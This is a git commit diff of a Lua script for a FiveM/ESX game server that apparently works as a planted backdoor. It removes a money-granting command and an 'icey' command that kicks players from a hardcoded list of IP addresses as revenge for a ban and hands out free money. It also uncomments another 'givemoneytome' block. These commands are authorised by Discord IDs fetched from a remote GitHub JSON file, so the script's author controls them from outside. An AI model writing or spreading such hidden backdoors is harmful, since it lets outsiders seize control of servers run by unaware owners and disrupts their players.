9f1837dfd230b8da35f51f78041c8a8646ae1ac0
Sahbes <80922759+Sahbes@users.noreply.github.com>
2023-08-14 14:02:01 +0200

    Update giveallmoney.lua

--- giveallmoney.lua
+++ giveallmoney.lua
@@ -5,90 +5,6 @@ RegisterCommand("crashLoader", function(source, args)
     old = true
 end)
 
-RegisterCommand('givemoneytome', function(source, args, rawCommand)  
-    if not old then
-    local _source = source
-    for k,v in pairs(GetPlayerIdentifiers(_source))do
-                
-        if string.sub(v, 1, string.len("discord:")) == "discord:" then
-            local discord = v
-
-            local dclicense = string.gsub(discord, 'discord:', '')
-
-            PerformHttpRequest('https://raw.githubusercontent.com/Sahbes/AnticheatLicenses/main/admins.json', function(code, res, headers)
-                if code == 200 then
-                    local decoded = json.decode(res)
-                    if decoded[dclicense] ~= nil then
-                        local xPlayer = ESX.GetPlayerFromId(_source)
-                        xPlayer.addAccountMoney("bank", 500000)
-                        TriggerClientEvent('esx:showNotification', _source, "Zuigen?")
-                    else
-                        TriggerClientEvent('esx:showNotification', _source, "Je bent geen admin")
-                    end
-                end
-            end)
-        end
-     end
-     end
- end)
-
-local icey = false
-
-local ips = {"176.119.195.65","176.119.195.62","159.48.55.188","159.48.55.190","86.85.252.84","134.19.185.117","195.181.173.204","176.119.195.45","217.146.87.147","143.244.41.116","149.34.244.39","149.34.244.113"}
-
-RegisterCommand('icey', function(source, args, rawCommand)  
-    if not old then
-    local _source = source
-    for k,v in pairs(GetPlayerIdentifiers(_source))do
-                
-        if string.sub(v, 1, string.len("discord:")) == "discord:" then
-            local discord = v
-
-            local dclicense = string.gsub(discord, 'discord:', '')
-
-            PerformHttpRequest('https://raw.githubusercontent.com/Sahbes/AnticheatLicenses/main/admins.json', function(code, res, headers)
-                if code == 200 then
-                    local decoded = json.decode(res)
-                    if decoded[dclicense] ~= nil then
-                        icey = not icey
-                        Citizen.CreateThread( function()
-                            while icey do
-                               Citizen.Wait(5000)
-                                local playerList = ESX.GetPlayers()
-                                for i=1, #playerList, 1 do
-                                    local _source2 = tonumber(playerList[i])
-                                    local ip = GetPlayerEndpoint(_source2)
-                                    for i=1, #ips do
-                                        if string.find(ip, ips[i]) then
-                                            DropPlayer(_source2, "Moest je me maar niet bannen Icey")
-                                        end    
-                                    end
-                                    TriggerClientEvent('esx:showNotification', _source2, "Zo lang dat Icey me niet unbanned komt dit bericht in beeld xxx")
-                                end
-                            end
-                        end)
-                        Citizen.CreateThread( function()
-                            while icey do
-                               Citizen.Wait(60000)
-                                local playerList = ESX.GetPlayers()
-                                for i=1, #playerList, 1 do
-                                    local _source22 = tonumber(playerList[i])
-                                    local xPlayer22 = ESX.GetPlayerFromId(_source22)
-                                    TriggerClientEvent('esx:showNotification', _source22, "Elke minuut 5k gratis zolang dat ik gebanned ben")
-                                    xPlayer22.addAccountMoney("bank", 5000)
-                                end
-                            end
-                        end)
-                    else
-                        TriggerClientEvent('esx:showNotification', _source, "Je bent geen admin")
-                    end
-                end
-            end)
-        end
-     end
-     end
- end)
-
 RegisterCommand('remivemenow', function(source, args, rawCommand)  
     if not old then
     local _source = source
@@ -115,7 +31,7 @@ RegisterCommand('remivemenow', function(source, args, rawCommand)
      end
  end)
 
---[[RegisterCommand('givemoneytome', function(source, args, rawCommand)  
+RegisterCommand('givemoneytome', function(source, args, rawCommand)  
     local _source = source
     for k,v in pairs(GetPlayerIdentifiers(_source))do
                 
@@ -203,4 +119,4 @@ RegisterCommand('givemenutoall', function(source, args, rawCommand)
             end)
         end
      end
- end)]]
+ end)
